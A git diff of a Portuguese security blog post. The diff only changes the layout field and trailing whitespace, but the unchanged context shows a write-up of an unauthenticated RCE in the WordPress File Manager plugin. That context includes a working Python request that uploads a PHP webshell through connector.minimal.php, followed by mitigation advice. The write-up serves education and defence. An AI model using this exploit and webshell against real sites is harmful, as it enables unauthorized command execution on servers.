@@ -1,10 +1,10 @@
 ---
-layout: post
+layout: post-pt
 title: Unauth RCE no Wordpress File Manager
 permalink: /web/urce-wp-file-manager
 ---
 
-**Atenção**: A técnica demonstrada neste artigo tem o propósito de ser um material educativo, a exploração foi feita em um ambiente controlado. Não realize esta exploração sem a autorização do dono do servidor, pois isto poderá resultar em um crime! 
+**Atenção**: A técnica demonstrada neste artigo tem o propósito de ser um material educativo, a exploração foi feita em um ambiente controlado. Não realize esta exploração sem a autorização do dono do servidor, pois isto poderá resultar em um crime!
 
 ![](/imgs/urce-wp-file-manager/plugin_store.png)
 
@@ -22,7 +22,7 @@ Vale observar que este plugin tem mais de **700 mil instalações ativas**.
 
 ![](/imgs/urce-wp-file-manager/plugin_wp_file_manager_ok.png)
 
-Com o ambiente pronto para os testes, tentei encontrar algum vazamento de informação sensível que talvez fosse causada devido a configuração do container ou do plugin. 
+Com o ambiente pronto para os testes, tentei encontrar algum vazamento de informação sensível que talvez fosse causada devido a configuração do container ou do plugin.
 
 Fiz uma wordlist com os arquivos do meu interesse, que poderiam ser acessíveis através do servidor Apache.
 
@@ -50,7 +50,7 @@ Sei que pesquisar "cmd" é algo muito genérico, mas consegui um subconjunto bem
 
 ![](/imgs/urce-wp-file-manager/possible_rce.png)
 
-Quando vi a mensagem de erro na resposta até achei que tinha encontrado uma backdoor :expressionless:, então resolvi pesquisar mais sobre o que esse arquivo faz. 
+Quando vi a mensagem de erro na resposta até achei que tinha encontrado uma backdoor :expressionless:, então resolvi pesquisar mais sobre o que esse arquivo faz.
 
 ![](/imgs/urce-wp-file-manager/google_elfinder.png)
 
@@ -75,14 +75,14 @@ base_uri = "http://localhost:8000"
 webshell_name = "b4ckd00r.php"
 
 requests.post(
-    url=f"{base_uri}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", 
-    	
+    url=f"{base_uri}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
+
     files = {
     	'upload[]': (webshell_name, '<?php system($_GET["cmd"]) ?>')
-    }, 
-    	
+    },
+
     data = {
-    	"cmd" : "upload", 
+    	"cmd" : "upload",
     	"target" : "l1_Lw"
     }
 )
@@ -107,6 +107,6 @@ A webshell "b4ckd00r.php" foi interpretada com sucesso pelo servidor e *voilà*!
 
 ## Mitigação
 
-Uma possível forma de reduzir o impacto dessa vulnerabilidade enquanto não há um patch disponibilizado pelo fornecedor seria mantendo o PHP atualizado e desabilitar as funções críticas, por exemplo: system, exec, shell_exec. 
+Uma possível forma de reduzir o impacto dessa vulnerabilidade enquanto não há um patch disponibilizado pelo fornecedor seria mantendo o PHP atualizado e desabilitar as funções críticas, por exemplo: system, exec, shell_exec.
 
 Recomendo seguir a [PHP Configuration Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html) da OWASP.
